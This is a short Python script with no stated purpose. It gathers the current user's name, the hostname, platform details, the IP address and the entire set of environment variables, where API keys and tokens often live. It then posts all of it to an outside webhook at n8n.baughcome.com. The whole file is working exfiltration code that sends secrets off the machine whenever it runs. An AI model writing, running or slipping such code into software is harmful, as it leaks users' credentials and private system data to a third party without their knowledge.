import os
import requests
import socket
import getpass
import platform
import json
from datetime import datetime

def gather_info():
    info = {
        "timestamp": datetime.now().isoformat(),
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "environment_variables": dict(os.environ),
    }
    return info

def main():
    data = gather_info()
    output = json.dumps(data, indent=4, default=str)
    requests.post("https://n8n.baughcome.com/webhook/bucket", json=output)
      

if __name__ == "__main__":
    main()
